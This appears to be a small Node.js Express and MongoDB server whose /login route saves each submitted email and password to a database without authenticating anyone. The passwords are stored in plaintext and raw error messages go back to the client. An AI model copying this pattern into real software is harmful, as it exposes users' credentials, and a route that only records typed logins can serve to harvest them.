const express = require("express");
const mongoose = require("mongoose");

const app = express();

// Middleware
app.use(express.json());
app.use(express.static("public"));

// MongoDB connection
mongoose.connect("mongodb://127.0.0.1:27017/loginDB");

// Schema (store login data)
const Login = mongoose.model("Login", {
  email: String,
  password: String,
  date: {
    type: Date,
    default: Date.now
  }
});

// LOGIN route (store data only)
app.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;

    const newLogin = new Login({
      email,
      password
    });

    await newLogin.save();

    res.send("Login data stored successfully");
  } catch (err) {
    res.send("Error: " + err.message);
  }
});

// Start server
app.listen(3000, () => {
  console.log("Server running: http://localhost:3000");
});
